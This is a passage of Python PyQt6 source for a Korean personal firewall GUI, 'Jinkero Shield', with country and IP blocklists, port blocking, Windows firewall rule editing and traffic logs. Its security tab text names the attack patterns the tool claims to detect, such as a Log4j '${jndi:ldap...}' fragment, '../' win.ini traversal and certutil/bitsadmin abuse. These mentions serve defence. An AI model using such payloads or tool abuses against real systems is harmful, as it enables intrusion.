        l_box.addWidget(desc)

        # 12개 주요 국가 2열 체크박스 그리드
        grid = QGridLayout()
        grid.setHorizontalSpacing(12)
        grid.setVerticalSpacing(6)
        self.country_checkboxes = {}
        for idx, (code, label_text) in enumerate(self.PRESET_COUNTRIES):
            chk = QCheckBox(label_text)
            chk.setChecked(code in self.config.blocked_countries)
            chk.toggled.connect(lambda checked, c=code: self._toggle_country(c, checked))
            self.country_checkboxes[code] = chk
            grid.addWidget(chk, idx // 2, idx % 2)
        l_box.addLayout(grid)

        # 사용자 정의 국가 코드 입력 및 추가 바
        custom_c_bar = QHBoxLayout()
        self.country_code_input = QLineEdit()
        self.country_code_input.setPlaceholderText("국가 코드 2자리 직접 입력 (예: HK, US, NL, SG, TR)")
        self.country_code_input.setMaxLength(6)
        self.country_code_input.returnPressed.connect(self._add_custom_country_code)
        custom_c_bar.addWidget(self.country_code_input)

        add_c_btn = QPushButton("국가 코드 차단 추가")
        add_c_btn.setObjectName("DangerButton")
        add_c_btn.clicked.connect(self._add_custom_country_code)
        custom_c_bar.addWidget(add_c_btn)

        del_c_btn = QPushButton("선택 국가 해제")
        del_c_btn.setObjectName("SecondaryButton")
        del_c_btn.clicked.connect(self._remove_selected_country_code)
        custom_c_bar.addWidget(del_c_btn)
        l_box.addLayout(custom_c_bar)

        # 현재 활성화된 차단 국가 코드 목록 표시
        self.active_country_lbl = QLabel("현재 차단 적용 중인 국가 코드 목록:")
        self.active_country_lbl.setStyleSheet("color: #FBBF24; font-size: 12px; font-weight: 700; margin-top: 2px;")
        l_box.addWidget(self.active_country_lbl)

        self.country_list_widget = QListWidget()
        self.country_list_widget.setMaximumHeight(95)
        l_box.addWidget(self.country_list_widget)
        self._refresh_country_list_ui()

        layout.addWidget(left_card, 5)

        # 우측: BlackIP & WhiteIP 리스트 관리
        right_card = QFrame()
        right_card.setObjectName("Card")
        r_box = QVBoxLayout(right_card)
        r_box.setContentsMargins(18, 16, 18, 16)

        r_title = QLabel("접근 차단(BlackIP) 및 허용(WhiteIP) 목록 관리")
        r_title.setObjectName("CardTitle")
        r_box.addWidget(r_title)

        ip_input_layout = QHBoxLayout()
        self.ip_input = QLineEdit()
        self.ip_input.setPlaceholderText("등록할 IP 주소 입력 (예: 114.80.22.10)")
        ip_input_layout.addWidget(self.ip_input)

        add_black_btn = QPushButton("BlackIP 차단 등록")
        add_black_btn.setObjectName("DangerButton")
        add_black_btn.clicked.connect(self._add_black_ip)
        ip_input_layout.addWidget(add_black_btn)

        add_white_btn = QPushButton("WhiteIP 신뢰 등록")
        add_white_btn.setObjectName("SuccessButton")
        add_white_btn.clicked.connect(self._add_white_ip)
        ip_input_layout.addWidget(add_white_btn)

        r_box.addLayout(ip_input_layout)

        list_layout = QHBoxLayout()
        
        # BlackIP
        b_box = QVBoxLayout()
        b_box.addWidget(QLabel(f"🚫 차단된 BlackIP 목록 ({INBOUND_BLOCK_RULE} 규칙 누적)"))
        self.black_list = QListWidget()
        self._refresh_black_list_ui()
        b_box.addWidget(self.black_list)

        b_btn_layout = QHBoxLayout()
        edit_b_btn = QPushButton("선택 IP 수정")
        edit_b_btn.setObjectName("SecondaryButton")
        edit_b_btn.clicked.connect(self._edit_black_ip)
        b_btn_layout.addWidget(edit_b_btn)

        del_b_btn = QPushButton("선택 삭제")
        del_b_btn.setObjectName("DangerButton")
        del_b_btn.clicked.connect(self._remove_black_ip)
        b_btn_layout.addWidget(del_b_btn)
        b_box.addLayout(b_btn_layout)
        list_layout.addLayout(b_box)

        # WhiteIP
        w_box = QVBoxLayout()
        w_box.addWidget(QLabel("✅ 신뢰하는 WhiteIP 목록"))
        self.white_list = QListWidget()
        for ip in sorted(list(self.config.white_ips)):
            self.white_list.addItem(ip)
        w_box.addWidget(self.white_list)

        w_btn_layout = QHBoxLayout()
        edit_w_btn = QPushButton("선택 IP 수정")
        edit_w_btn.setObjectName("SecondaryButton")
        edit_w_btn.clicked.connect(self._edit_white_ip)
        w_btn_layout.addWidget(edit_w_btn)

        del_w_btn = QPushButton("선택 삭제")
        del_w_btn.setObjectName("SecondaryButton")
        del_w_btn.clicked.connect(self._remove_white_ip)
        w_btn_layout.addWidget(del_w_btn)
        w_box.addLayout(w_btn_layout)
        list_layout.addLayout(w_box)

        r_box.addLayout(list_layout)
        layout.addWidget(right_card, 6)

        return widget

    def _build_security_tab(self) -> QWidget:
        widget = QWidget()
        layout = QHBoxLayout(widget)
        layout.setContentsMargins(10, 12, 10, 10)
        layout.setSpacing(16)

        # 포트 보안 (멈춤 증상 원천 차단: 백그라운드 스레드 비동기 적용)
        port_card = QFrame()
        port_card.setObjectName("Card")
        p_box = QVBoxLayout(port_card)
        p_box.setContentsMargins(18, 16, 18, 16)
        
        p_title = QLabel("위험 포트 단일 규칙 차단")
        p_title.setObjectName("CardTitle")
        p_box.addWidget(p_title)

        self.chk_p3389 = QCheckBox("RDP 원격 데스크톱 (포트 3389 차단)")
        self.chk_p3389.setChecked(3389 in self.config.blocked_ports)
        self.chk_p3389.toggled.connect(lambda c: self._toggle_port(3389, c))
        p_box.addWidget(self.chk_p3389)

        self.chk_p445 = QCheckBox("SMB/랜섬웨어 전파 (포트 445 차단)")
        self.chk_p445.setChecked(445 in self.config.blocked_ports)
        self.chk_p445.toggled.connect(lambda c: self._toggle_port(445, c))
        p_box.addWidget(self.chk_p445)

        self.chk_p135 = QCheckBox("RPC 엔드포인트 매퍼 (포트 135 차단)")
        self.chk_p135.setChecked(135 in self.config.blocked_ports)
        self.chk_p135.toggled.connect(lambda c: self._toggle_port(135, c))
        p_box.addWidget(self.chk_p135)

        self.chk_p21 = QCheckBox("FTP/Telnet 취약 프로토콜 (포트 21, 23 차단)")
        self.chk_p21.setChecked(21 in self.config.blocked_ports)
        self.chk_p21.toggled.connect(lambda c: self._toggle_port(21, c))
        p_box.addWidget(self.chk_p21)

        p_box.addSpacing(14)
        cp_layout = QHBoxLayout()
        self.custom_port_input = QLineEdit()
        self.custom_port_input.setPlaceholderText("포트 번호 입력 (예: 5985)")
        cp_layout.addWidget(self.custom_port_input)
        cp_btn = QPushButton("차단 등록")
        cp_btn.setObjectName("DangerButton")
        cp_btn.clicked.connect(self._add_custom_port)
        cp_layout.addWidget(cp_btn)
        p_box.addLayout(cp_layout)

        p_box.addStretch()
        layout.addWidget(port_card, 1)

        # 가독성 및 글자 잘림 완벽 해결 설명 뷰
        sec_card = QFrame()
        sec_card.setObjectName("Card")
        s_box = QVBoxLayout(sec_card)
        s_box.setContentsMargins(20, 18, 20, 18)
        s_box.setSpacing(12)

        s_title = QLabel("🛡️ 지능형 금융권 특화 방어 및 파일 위변조 방지 (상세 원리)")
        s_title.setObjectName("CardTitle")
        s_box.addWidget(s_title)

        html_desc = f"""
        <div style="color: #E2E8F0; font-family: 'Malgun Gothic', '맑은 고딕', sans-serif; line-height: 1.6;">
            <div style="margin-bottom: 12px;">
                <b style="color: #FBBF24; font-size: 14px;">1. 중국발 금융권 표적 APT 및 웹셸(WebShell) 차단 + AI 변종 탐지</b><br/>
                <span style="color: #CBD5E1; font-size: 13px;">
                최근 금융망 침투에 쓰이는 Log4j(${{jndi:ldap...}}), Fastjson 역직렬화, Spring4Shell 및 악성 웹셸(.jsp/.asp) 업로드 패턴을 심층 패킷 레벨(DPI)과 샤넌 엔트로피 AI 엔진으로 이중 검사하여 확실한 공격만 즉시 드롭합니다.
                </span>
            </div>
            <div style="margin-bottom: 12px;">
                <b style="color: #FBBF24; font-size: 14px;">2. 외부 침입을 통한 시스템 파일 조작 및 위변조 방어</b><br/>
                <span style="color: #CBD5E1; font-size: 13px;">
                원격 공격자의 시스템 장악을 위한 디렉터리 경로 조작(../, win.ini 탐색), SQL 인젝션, 악성 파워셸/명령어 실행(certutil, bitsadmin 등)을 인라인으로 원천 차단합니다.
                </span>
            </div>
            <div style="margin-bottom: 12px;">
                <b style="color: #FBBF24; font-size: 14px;">3. Windows Hosts 파일 금융 파밍(Pharming) 실시간 감시</b><br/>
                <span style="color: #CBD5E1; font-size: 13px;">
                은행 및 금융 사이트 접속을 가짜 피싱 사이트로 유도하기 위해 C:\\Windows\\System32\\drivers\\etc\\hosts 파일을 무단 조작하려는 시도를 상시 감시하여 즉시 경고합니다.
                </span>
            </div>
            <div style="margin-bottom: 12px;">
                <b style="color: #FBBF24; font-size: 14px;">4. Windows 방화벽 단일 통합 규칙({INBOUND_BLOCK_RULE}) 자동 누적 연동</b><br/>
                <span style="color: #CBD5E1; font-size: 13px;">
                규칙이 무한정 늘어나 PC가 느려지는 것을 방지하기 위해 '{INBOUND_BLOCK_RULE}' 단일 규칙에 모든 차단 대상 IP를 집약하여 윈도우 커널 단에서 초고속으로 드롭합니다.
                </span>
            </div>
        </div>
        """
        desc_view = QTextEdit()
        desc_view.setReadOnly(True)
        desc_view.setHtml(html_desc)
        desc_view.setStyleSheet("background: transparent; border: none; padding: 0;")
        s_box.addWidget(desc_view)

        self.fim_status_lbl = QLabel("✅ 파일 무결성 감시(FIM) 정상 작동 중: 윈도우 Hosts 및 시스템 경로 보호")
        self.fim_status_lbl.setStyleSheet("font-size: 13px; color: #34D399; font-weight: 700; padding-top: 4px;")
        s_box.addWidget(self.fim_status_lbl)

        layout.addWidget(sec_card, 2)
        return widget

    def _build_firewall_manager_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(10, 12, 10, 10)
        layout.setSpacing(10)

        # 1. 상단: Windows 방화벽 실제 연동 규칙 관리
        top_bar = QHBoxLayout()
        info_lbl = QLabel(f"Windows 고급 방화벽에 실제 등록된 Jinkero Shield 규칙 설정값 ({INBOUND_BLOCK_RULE} / {PORT_BLOCK_RULE})")
        info_lbl.setStyleSheet("color: #F8FAFC; font-weight: 700; font-size: 14px;")
        top_bar.addWidget(info_lbl)
        top_bar.addStretch()

        refresh_btn = QPushButton("규칙 새로고침")
        refresh_btn.setObjectName("SecondaryButton")
        refresh_btn.clicked.connect(self._async_sync_firewall_rules)
        top_bar.addWidget(refresh_btn)

        edit_rule_btn = QPushButton("선택 규칙 IP 편집")
        edit_rule_btn.setObjectName("SecondaryButton")
        edit_rule_btn.clicked.connect(self._edit_selected_firewall_rule)
        top_bar.addWidget(edit_rule_btn)

        del_rule_btn = QPushButton("선택 규칙 삭제")
        del_rule_btn.setObjectName("DangerButton")
        del_rule_btn.clicked.connect(self._delete_selected_firewall_rule)
        top_bar.addWidget(del_rule_btn)

        layout.addLayout(top_bar)

        self.fw_table = QTableWidget(0, 6)
        self.fw_table.setHorizontalHeaderLabels(["규칙 이름", "방향", "액션", "프로토콜", "차단 대상 IP 목록", "차단 포트"])
        fw_hdr = self.fw_table.horizontalHeader()
        fw_hdr.setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        fw_hdr.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        fw_hdr.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        fw_hdr.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)
        fw_hdr.setSectionResizeMode(4, QHeaderView.ResizeMode.Stretch)
        self.fw_table.setColumnWidth(0, 180)
        self.fw_table.setColumnWidth(1, 65)
        self.fw_table.setColumnWidth(2, 65)
        self.fw_table.setColumnWidth(3, 65)
        self.fw_table.setColumnWidth(5, 100)
        layout.addWidget(self.fw_table, 2)

        # 2. 하단: 국가별 차단에 의해 자동 차단/방화벽 동기화된 IP 기록 목록
        geo_header = QHBoxLayout()
        geo_title = QLabel(f"🌏 국가별 차단에 의해 자동 방화벽({INBOUND_BLOCK_RULE}) 동기화된 IP 탐지/격리 기록")
        geo_title.setStyleSheet("color: #FBBF24; font-weight: 700; font-size: 14px; margin-top: 6px;")
        geo_header.addWidget(geo_title)
        geo_header.addStretch()

        clear_geo_hist_btn = QPushButton("기록 비우기")
        clear_geo_hist_btn.setObjectName("SecondaryButton")
        clear_geo_hist_btn.clicked.connect(self._clear_geo_history)
        geo_header.addWidget(clear_geo_hist_btn)

        layout.addLayout(geo_header)

        self.geo_hist_table = QTableWidget(0, 4)
        self.geo_hist_table.setHorizontalHeaderLabels(["탐지 일시", "차단된 IP", "소속 국가", f"탐지/격리 사유 ({INBOUND_BLOCK_RULE} 동기화 완료)"])
        geo_hist_hdr = self.geo_hist_table.horizontalHeader()
        geo_hist_hdr.setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        geo_hist_hdr.setSectionResizeMode(0, QHeaderView.ResizeMode.ResizeToContents)
        geo_hist_hdr.setSectionResizeMode(1, QHeaderView.ResizeMode.ResizeToContents)
        geo_hist_hdr.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)
        geo_hist_hdr.setSectionResizeMode(3, QHeaderView.ResizeMode.Stretch)
        self.geo_hist_table.setColumnWidth(0, 150)
        self.geo_hist_table.setColumnWidth(1, 130)
        self.geo_hist_table.setColumnWidth(2, 80)
        layout.addWidget(self.geo_hist_table, 3)

        self._refresh_geo_history_table()
        return widget

    def _refresh_geo_history_table(self):
        records = self.config.geo_blocked_history
        self.geo_hist_table.setRowCount(len(records))
        for r, rec in enumerate(records):
            self.geo_hist_table.setItem(r, 0, QTableWidgetItem(rec.get("timestamp", "")))
            
            ip_item = QTableWidgetItem(rec.get("ip", ""))
            ip_item.setForeground(QColor("#EF4444"))
            self.geo_hist_table.setItem(r, 1, ip_item)

            country_item = QTableWidgetItem(rec.get("country", ""))
            country_item.setForeground(QColor("#FBBF24"))
            self.geo_hist_table.setItem(r, 2, country_item)

            reason_item = QTableWidgetItem(f"{INBOUND_BLOCK_RULE} 등록 완료: {rec.get('reason', '')}")
            self.geo_hist_table.setItem(r, 3, reason_item)

    def _clear_geo_history(self):
        self.config.geo_blocked_history.clear()
        self.config.save()
        self._refresh_geo_history_table()

    def _build_network_rank_tab(self) -> QWidget:
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(10, 12, 10, 10)
        layout.setSpacing(10)

        r_header = QHBoxLayout()
        r_title = QLabel("🏆 로컬 PC 네트워크 연결 활성 프로세스 순위 (실시간 집계)")
        r_title.setStyleSheet("font-size: 15px; font-weight: 700; color: #F8FAFC;")
        r_header.addWidget(r_title)
        r_header.addStretch()
        layout.addLayout(r_header)

        self.rank_table = QTableWidget(0, 3)
        self.rank_table.setHorizontalHeaderLabels(["순위", "프로세스 이름", "누적 연결/트래픽 이벤트 횟수"])
        self.rank_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        layout.addWidget(self.rank_table)

        return widget

    # 시스템 트레이
    def _init_system_tray(self):
        self.tray_icon = QSystemTrayIcon(self)
        
        pixmap = QPixmap(32, 32)
        pixmap.fill(Qt.GlobalColor.transparent)
        p = QPainter(pixmap)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        p.setBrush(QColor("#F59E0B"))
        p.setPen(Qt.PenStyle.NoPen)
        p.drawRoundedRect(2, 2, 28, 28, 8, 8)
        p.setPen(QColor("#0F172A"))
        p.setFont(QFont("Segoe UI", 12, QFont.Weight.Bold))
        p.drawText(8, 22, "J")
        p.end()

        icon = QIcon(pixmap)
        self.setWindowIcon(icon)
        self.tray_icon.setIcon(icon)
        self.tray_icon.setToolTip(f"Jinkero Shield ({APP_VERSION}) - AI 개인용 방화벽 백그라운드 작동 중")

        tray_menu = QMenu()
        show_action = QAction("방화벽 대시보드 열기", self)
        show_action.triggered.connect(self.showNormal)
        tray_menu.addAction(show_action)

        tray_menu.addSeparator()

        quit_action = QAction("완전 종료", self)
        quit_action.triggered.connect(self._force_quit)
        tray_menu.addAction(quit_action)

        self.tray_icon.setContextMenu(tray_menu)
        self.tray_icon.activated.connect(self._tray_activated)
        self.tray_icon.show()

    def _tray_activated(self, reason):
        if reason == QSystemTrayIcon.ActivationReason.DoubleClick:
            self.showNormal()
            self.activateWindow()

    def closeEvent(self, event):
        if self.tray_icon.isVisible():
            self.hide()
            self.tray_icon.showMessage(
                "Jinkero Shield 백그라운드 작동 중",
                "프로그램이 트레이 아이콘으로 최소화되어 백그라운드에서 PC를 지속 보호합니다.",
                QSystemTrayIcon.MessageIcon.Information,
                2000
            )
            event.ignore()
        else:
            self._cleanup_services()
            event.accept()

    def _force_quit(self):
        self._cleanup_services()
        self.tray_icon.hide()
        QApplication.quit()

    def _cleanup_services(self):
        self.waf.stop()
        self.net_monitor.stop()
        self.file_guard.stop()

    def _start_services(self):
        try:
            self.waf.start()
        except Exception:
            pass
        self.net_monitor.start()
        self.file_guard.start()

    def on_traffic_update(self, rx_kbs: float, tx_kbs: float):
        self.traffic_chart.update_data(rx_kbs, tx_kbs)

    def _refresh_network_ranks(self):
        top_procs = self.net_monitor.get_top_processes(15)
        self.rank_table.setRowCount(len(top_procs))
        for r, (pname, count) in enumerate(top_procs):
            rank_item = QTableWidgetItem(f"#{r + 1}")
            rank_item.setTextAlignment(Qt.AlignmentFlag.AlignCenter)
            self.rank_table.setItem(r, 0, rank_item)
            self.rank_table.setItem(r, 1, QTableWidgetItem(pname))
            self.rank_table.setItem(r, 2, QTableWidgetItem(f"{count:,} 회"))

    # UI 멈춤 방지: 비동기 스레드에서 윈도우 방화벽 명령 실행
    def _async_sync_firewall_rules(self):
        def worker():
            sync_inbound_block_rule(self.config.black_ips)
            sync_port_block_rule(self.config.blocked_ports)
            details = get_shield_firewall_details()
            self.bridge.firewall_synced.emit(details)

        t = threading.Thread(target=worker, daemon=True)
        t.start()

    def _on_firewall_details_ready(self, rules: list):
        self.fw_table.setRowCount(len(rules))
        for r, rule in enumerate(rules):
            self.fw_table.setItem(r, 0, QTableWidgetItem(str(rule.get("DisplayName", rule.get("Name", "")))))
            self.fw_table.setItem(r, 1, QTableWidgetItem(str(rule.get("Direction", "Inbound"))))
            self.fw_table.setItem(r, 2, QTableWidgetItem(str(rule.get("Action", "Block"))))
            self.fw_table.setItem(r, 3, QTableWidgetItem(str(rule.get("Protocol", "Any"))))
            self.fw_table.setItem(r, 4, QTableWidgetItem(str(rule.get("RemoteAddress", ""))))
            self.fw_table.setItem(r, 5, QTableWidgetItem(str(rule.get("LocalPort", ""))))
        # 국가별 차단 및 AI 기록 리스트도 동시 갱신
        if hasattr(self, "geo_hist_table"):
            self._refresh_geo_history_table()
        if hasattr(self, "ai_table"):
            self._refresh_ai_history_table()

    def _edit_selected_firewall_rule(self):
        row = self.fw_table.currentRow()
        if row < 0:
            QMessageBox.warning(self, "선택 필요", "편집할 방화벽 규칙을 먼저 표에서 선택해 주세요.")
            return

        rule_name = self.fw_table.item(row, 0).text()
        current_ips = self.fw_table.item(row, 4).text() if self.fw_table.item(row, 4) else ""

        new_ips, ok = QInputDialog.getText(
            self, "방화벽 규칙 IP 목록 편집",
            f"[{rule_name}] 에 적용할 차단 IP 목록 (쉼표 구분):",
            QLineEdit.EchoMode.Normal,
            current_ips
        )
        if ok:
            ip_set = {ip.strip() for ip in new_ips.split(",") if ip.strip()}
            self.config.black_ips = ip_set
            self.config.save()
            self._async_sync_firewall_rules()
            self._refresh_black_list_ui()
            QMessageBox.information(self, "완료", f"'{rule_name}' 규칙의 IP 목록이 성공적으로 업데이트되었습니다.")

    def _delete_selected_firewall_rule(self):
        row = self.fw_table.currentRow()
        if row < 0:
            QMessageBox.warning(self, "선택 필요", "삭제할 방화벽 규칙을 선택해 주세요.")
            return

        rule_name = self.fw_table.item(row, 0).text()
        reply = QMessageBox.question(
            self, "규칙 삭제 확인",
            f"Windows 방화벽에서 '{rule_name}' 규칙을 완전히 삭제하시겠습니까?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )
        if reply == QMessageBox.StandardButton.Yes:
            delete_shield_rule(rule_name)
            self._async_sync_firewall_rules()
            QMessageBox.information(self, "삭제 완료", f"'{rule_name}' 규칙이 방화벽에서 제거되었습니다.")

    def _refresh_black_list_ui(self):
        self.black_list.clear()
        for ip in sorted(list(self.config.black_ips)):
            self.black_list.addItem(ip)
        self.kpi_geo.set_value(f"{len(self.config.black_ips)}건")

    def _add_black_ip(self):
        ip = self.ip_input.text().strip()
        if ip:
            self.config.add_black_ip(ip)
            self._async_sync_firewall_rules()
            self._refresh_black_list_ui()
            self.ip_input.clear()

    def _edit_black_ip(self):
        item = self.black_list.currentItem()
        if not item:
            QMessageBox.warning(self, "선택 필요", "수정할 BlackIP를 목록에서 선택해 주세요.")
            return
        old_ip = item.text()
        new_ip, ok = QInputDialog.getText(self, "BlackIP 수정", "새 IP 주소:", text=old_ip)
        if ok and new_ip.strip() and new_ip.strip() != old_ip:
            self.config.remove_black_ip(old_ip)
            self.config.add_black_ip(new_ip.strip())
            self._async_sync_firewall_rules()
            self._refresh_black_list_ui()

    def _remove_black_ip(self):
        item = self.black_list.currentItem()
        if item:
            ip = item.text()
            self.config.remove_black_ip(ip)
            self._async_sync_firewall_rules()
            self._refresh_black_list_ui()

    def _add_white_ip(self):
        ip = self.ip_input.text().strip()
        if ip:
            self.config.add_white_ip(ip)
            self.white_list.addItem(ip)
            self.ip_input.clear()

    def _edit_white_ip(self):
        item = self.white_list.currentItem()
        if not item:
            QMessageBox.warning(self, "선택 필요", "수정할 WhiteIP를 목록에서 선택해 주세요.")
            return
        old_ip = item.text()
        new_ip, ok = QInputDialog.getText(self, "WhiteIP 수정", "새 IP 주소:", text=old_ip)
        if ok and new_ip.strip() and new_ip.strip() != old_ip:
            self.config.remove_white_ip(old_ip)
            self.config.add_white_ip(new_ip.strip())
            self.white_list.takeItem(self.white_list.row(item))
            self.white_list.addItem(new_ip.strip())

    def _remove_white_ip(self):
        item = self.white_list.currentItem()
        if item:
            ip = item.text()
            self.config.remove_white_ip(ip)
            self.white_list.takeItem(self.white_list.row(item))

    def _toggle_startup(self, checked: bool):
        set_startup_enabled(checked)

    def _toggle_master_switch(self, event):
        self.master_switch.setChecked(not self.master_switch.isChecked())
        is_active = self.master_switch.isChecked()
        self.config.is_active = is_active
        self.config.save()
        if is_active:
            self.status_lbl.setText("보호 상태: 실시간 활성화됨")
            self.status_lbl.setStyleSheet("font-size: 14px; font-weight: 700; color: #38BDF8;")
        else:
            self.status_lbl.setText("보호 상태: 일시 중지됨")
            self.status_lbl.setStyleSheet("font-size: 14px; font-weight: 700; color: #94A3B8;")

    def _toggle_country(self, code: str, checked: bool):
        self.config.toggle_country(code.upper(), checked)
        self._refresh_country_list_ui()

    def _refresh_country_list_ui(self):
        if not hasattr(self, "country_list_widget"):
            return
        self.country_list_widget.clear()
        preset_map = dict(self.PRESET_COUNTRIES)
        sorted_codes = sorted(list(self.config.blocked_countries))
        for code in sorted_codes:
            desc = preset_map.get(code, f"사용자 지정 국가 코드 ({code})")
            self.country_list_widget.addItem(f"[{code}]  {desc}")
        if hasattr(self, "active_country_lbl"):
            self.active_country_lbl.setText(f"현재 차단 적용 중인 국가 목록 (총 {len(sorted_codes)}개국):")

    def _add_custom_country_code(self):
        raw = self.country_code_input.text().strip().upper()
        if not raw:
            return
        # 쉼표나 공백으로 여러 국가 코드(예: US, HK) 동시 입력 지원
        codes = [c.strip() for c in raw.replace(" ", ",").split(",") if c.strip()]
        added = []
        for code in codes:
            if len(code) == 2 and code.isalpha():
                if code == "KR":
                    QMessageBox.warning(self, "주의", "대한민국(KR) 국가 코드는 국내 네트워크 보호를 위해 차단할 수 없습니다.")
                    continue
                self.config.toggle_country(code, True)
                if code in self.country_checkboxes:
                    self.country_checkboxes[code].blockSignals(True)
                    self.country_checkboxes[code].setChecked(True)
                    self.country_checkboxes[code].blockSignals(False)
                added.append(code)
            else:
                QMessageBox.warning(self, "입력 형식 안내", f"'{code}'는 올바른 2자리 영문 ISO 국가 코드가 아닙니다. (예: US, HK, NL, SG, JP)")
        self.country_code_input.clear()
        self._refresh_country_list_ui()
        if added:
            QMessageBox.information(self, "국가 차단 추가 완료", f"국가 코드 [{', '.join(added)}]가 실시간 GeoIP 차단 목록에 등록되었습니다.")

    def _remove_selected_country_code(self):
        item = self.country_list_widget.currentItem()
        if not item:
            QMessageBox.warning(self, "선택 필요", "차단 해제할 국가를 아래 목록에서 먼저 선택해 주세요.")
            return
        txt = item.text()
        if txt.startswith("[") and "]" in txt:
            code = txt[1:txt.index("]")].strip().upper()
            self.config.toggle_country(code, False)
            if code in self.country_checkboxes:
                self.country_checkboxes[code].blockSignals(True)
                self.country_checkboxes[code].setChecked(False)
                self.country_checkboxes[code].blockSignals(False)
            self._refresh_country_list_ui()

    # 포트 토글 시 UI 멈춤 방지: 비동기 갱신
    def _toggle_port(self, port: int, checked: bool):
        self.config.toggle_port(port, checked)
        self._async_sync_firewall_rules()

    def _add_custom_port(self):
        txt = self.custom_port_input.text().strip()
        if txt.isdigit():
            port = int(txt)
            self.config.toggle_port(port, True)
            self._async_sync_firewall_rules()
            self.custom_port_input.clear()
            QMessageBox.information(self, "완료", f"포트 {port}가 Windows 방화벽({PORT_BLOCK_RULE}) 및 쉴드에 차단 등록되었습니다.")

    def _filter_logs_by_mode(self, mode: str):
        self.current_filter_mode = mode
        self.tabs.setCurrentIndex(0)
        self._render_log_table()

    def _set_log_row(self, row: int, entry: dict):
        self.table.setItem(row, 0, QTableWidgetItem(entry.get("timestamp", "")))
        self.table.setItem(row, 1, QTableWidgetItem(entry.get("ip", "")))
        self.table.setItem(row, 2, QTableWidgetItem(entry.get("country", "")))
        self.table.setItem(row, 3, QTableWidgetItem(f"{entry.get('method', '')} {entry.get('path', '')}"))
        
        action = entry.get("action", "")
        act_item = QTableWidgetItem(action)
        if "BLOCK" in action:
            act_item.setForeground(QColor("#EF4444"))
        elif "ALERT" in action:
            act_item.setForeground(QColor("#F59E0B"))
        else:
            act_item.setForeground(QColor("#10B981"))
        self.table.setItem(row, 4, act_item)

        ai_score = int(entry.get("ai_score", 0))
        score_item = QTableWidgetItem(f"{ai_score}점")
        if ai_score >= 85:
            score_item.setForeground(QColor("#EF4444"))
        elif ai_score >= 65:
            score_item.setForeground(QColor("#F59E0B"))
        else:
            score_item.setForeground(QColor("#38BDF8"))
        self.table.setItem(row, 5, score_item)

        self.table.setItem(row, 6, QTableWidgetItem(entry.get("rule", "")))
        self.table.setItem(row, 7, QTableWidgetItem(entry.get("details", "")))

    def _render_log_table(self):
        self.table.setRowCount(0)
        self.displayed_logs = []
        for entry in self.all_logs:
            if self.current_filter_mode == "BLOCKED_ONLY":
                if "BLOCK" in entry.get("action", ""):
                    self.displayed_logs.append(entry)
            else:
                self.displayed_logs.append(entry)

        if self.current_filter_mode == "BLOCKED_ONLY":
            self.log_mode_label.setText(f"🚨 차단된 지능형 침해 시도만 필터링됨 ({len(self.displayed_logs)}건) — 행 클릭 시 하단 상세보기")
            self.log_mode_label.setStyleSheet("font-weight: 700; color: #EF4444; font-size: 13px;")
        else:
            self.log_mode_label.setText(f"전체 트래픽 스트림 (총 {len(self.displayed_logs)}건) — 💡 표의 행을 클릭하면 하단에 상세 분석 정보가 표시됩니다.")
            self.log_mode_label.setStyleSheet("font-weight: 700; color: #FBBF24; font-size: 13px;")

        for row, entry in enumerate(self.displayed_logs):
            self.table.insertRow(row)
            self._set_log_row(row, entry)

    def add_log_entry(self, entry: dict):
        self.all_logs.insert(0, entry)
        if len(self.all_logs) > 2000:
            self.all_logs.pop()

        self.stat_total_inspected += 1
        action = entry.get("action", "ALLOWED")
        
        if "BLOCK" in action:
            self.stat_threats_blocked += 1
            if entry.get("rule") in ("GEO_BLOCK", "BLACK_LIST", "GEO_COUNTRY_BLOCK"):
                self.stat_geo_blocked += 1
            self._refresh_black_list_ui()

        if "AI" in action and hasattr(self, "ai_table"):
            self._refresh_ai_history_table()

        self.kpi_inspected.set_value(str(self.stat_total_inspected))
        self.kpi_threats.set_value(str(self.stat_threats_blocked))

        should_display = True
        if self.current_filter_mode == "BLOCKED_ONLY" and "BLOCK" not in action:
            should_display = False

        if should_display:
            self.displayed_logs.insert(0, entry)
            row = 0
            self.table.insertRow(row)
            self._set_log_row(row, entry)

            if self.table.rowCount() > 1000:
                self.table.removeRow(self.table.rowCount() - 1)
                self.displayed_logs.pop()

    def show_file_alert(self, alert: dict):
        self.fim_status_lbl.setText(f"🚨 {alert.get('description', '')}")
        self.fim_status_lbl.setStyleSheet("font-size: 13px; color: #EF4444; font-weight: bold;")
        self.add_log_entry({
            "timestamp": alert.get("timestamp"),
            "ip": "127.0.0.1",
            "country": "LOCAL",
            "method": "FIM",
            "path": alert.get("path"),
            "action": "ALERT_FILE_TAMPER",
            "rule": "FILE_INTEGRITY",
            "ai_score": 95,
            "details": alert.get("description")
        })

    def _export_logs_csv(self):
        path, _ = QFileDialog.getSaveFileName(self, "로그 내보내기", "jinkero_shield_logs.csv", "CSV Files (*.csv)")
        if path:
            try:
                with open(path, "w", newline="", encoding="utf-8-sig") as f:
                    writer = csv.writer(f)
                    writer.writerow(["일시", "출발지 IP", "국가", "타깃/포트", "액션", "AI 위협점수", "탐지 규칙", "세부 위협 내역"])
                    for r in range(self.table.rowCount()):
                        row_data = [self.table.item(r, c).text() if self.table.item(r, c) else "" for c in range(8)]
                        writer.writerow(row_data)
                QMessageBox.information(self, "완료", "로그가 CSV로 성공적으로 내보내졌습니다.")
            except Exception as e:
                QMessageBox.critical(self, "오류", f"로그 저장 실패: {e}")

    def _clear_logs(self):
        self.all_logs.clear()
        self.displayed_logs.clear()
        self.table.setRowCount(0)
        self.detail_text.clear()
        self.log_mode_label.setText("전체 트래픽 스트림 (총 0건)")
